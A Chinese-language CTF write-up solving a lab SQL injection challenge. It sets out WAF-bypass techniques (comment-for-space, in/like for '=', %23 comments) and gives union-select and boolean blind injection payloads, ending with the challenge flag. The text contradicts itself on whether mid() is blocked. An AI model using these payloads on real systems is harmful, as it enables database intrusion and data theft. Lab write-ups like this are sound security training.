---
title: "[SWPUCTF 2021 新生赛] sql"
date: 2026-05-18
category: WEB
tags:
  - PHP
  - SQL注入
  - WAF绕过
  - 盲注
NSSCTF: https://www.nssctf.cn/problem/442
---

# [SWPUCTF 2021 新生赛] sql

## 题目信息

- **URL**: `http://node7.anna.nssctf.cn:29525/`
- **类型**: SQL 注入 + WAF 绕过
- **核心考点**: 空格/`=`/`substr`/`where` 过滤绕过 + 回显截断 + 逐字符盲注提取 flag

## 源码（通过错误回显和测试推断）

```php
<?php
// 简化推断
$wllm = $_GET['wllm'];
$sql = "SELECT id, username, password FROM users WHERE id='$wllm' LIMIT 0,1";
// WAF 过滤了空格、=、substr、where 等
// 回显时 PHP 对第2列(username)截断到20字符
?>
```

## WAF 过滤分析

| 过滤项 | 被拦截 | 绕过方式 |
|--------|--------|----------|
| 空格 (`%20`) | ✅ | `/**/` 替代 |
| `=` | ✅ | `like` / `in` 替代 |
| `where` | ✅ | `where/**/column/**/in/**/(value)` 或 `like` |
| `substr` / `substring` | ✅ | `mid()` 替代（部分环境） |
| `-- ` / `--+` | ✅ | `%23` (`#`) 替代 |
| `and` / `&&` | ✅ | 使用布尔盲注的 `OR` + `IF` 构造 |

## 解题过程

### Step 1：确认注入点与列数

```
?wllm=1'          → SQL 语法错误
?wllm=1'%23       → 正常回显
?wllm=1'/**/order/**/by/**/3%23  → 正常
?wllm=1'/**/order/**/by/**/4%23  → Unknown column '4'
```

确认：**3 列，单引号闭合**。

Union 确认回显位：
```
?wllm=-1'/**/union/**/select/**/1,2,3%23
→ Your Login name:2
→ Your Password:3
```

### Step 2：获取数据库结构

**数据库名**：
```
?wllm=-1'/**/union/**/select/**/1,database(),3%23
→ test_db
```

**表名**（`=` 被过滤，用 `like` / `in` 绕过 `where`）：
```
?wllm=-1'/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema/**/in/**/(database())%23
→ LTLT_flag,users
```

**列名**：
```
?wllm=-1'/**/union/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_name/**/in/**/('LTLT_flag')%23
→ id,flag
```

### Step 3：发现回显截断与 substr 过滤

直接查询 flag：
```
?wllm=-1'/**/union/**/select/**/1,flag,3/**/from/**/LTLT_flag%23
→ NSSCTF{e30a6b8b-b978
```

只显示 **20 字符**，被 PHP 层截断。

尝试用 `substr` / `left` / `substring` 分段：
```
?wllm=-1'/**/union/**/select/**/1,substr(flag,1,10),3/**/from/**/LTLT_flag%23
→ （空/WAF）
```

`substr`、`substring`、`left`、`mid` 均被 WAF 拦截或返回空。

### Step 4：盲注提取完整 flag

由于直接回显被截断、截取函数被过滤，改用**布尔盲注**逐字符提取 `hex(flag)`。

**盲注原语**：
```sql
'/**/OR/**/IF(ascii(mid((SELECT/**/hex(flag)/**/FROM/**/LTLT_flag/**/LIMIT/**/1),N,1))>M,1,0)%23
```

- `mid()`：在当前靶场环境中可用（用于子查询内部）
- `ascii()`：将 hex 字符转为 ASCII 码进行比较
- `(SELECT hex(flag) FROM LTLT_flag LIMIT 1)`：子查询获取 hex 编码的 flag
- `IF(condition, 1, 0)`：条件为真时返回 1，触发回显差异

通过逐位二分比较 `ascii(mid(hex_flag, N, 1))`，提取完整的 88 个 hex 字符（对应 44 字节 flag），再 hex 解码得到完整 flag。

## Flag

```
NSSCTF{e30a6b8b-b978-4440-a448-6cec1e27604f}
```

## 总结

- **WAF 绕过三板斧**：`/**/` 替空格、`like/in` 替 `=`、`%23` 替注释
- **回显截断**是 PHP 层的硬限制（20 字符），union select 直接读无法突破
- **`substr` 家族被过滤**时，`mid()` 是 MariaDB 中有效的替代函数
- 当直接回显和截取都失效时，**布尔盲注**是最可靠的兜底方案：将目标转为 `hex()` 后逐字符 `ascii()` 比较，不受长度限制
- 盲注虽然慢，但在 WAF 严格、回显受限的场景下是唯一稳定路径
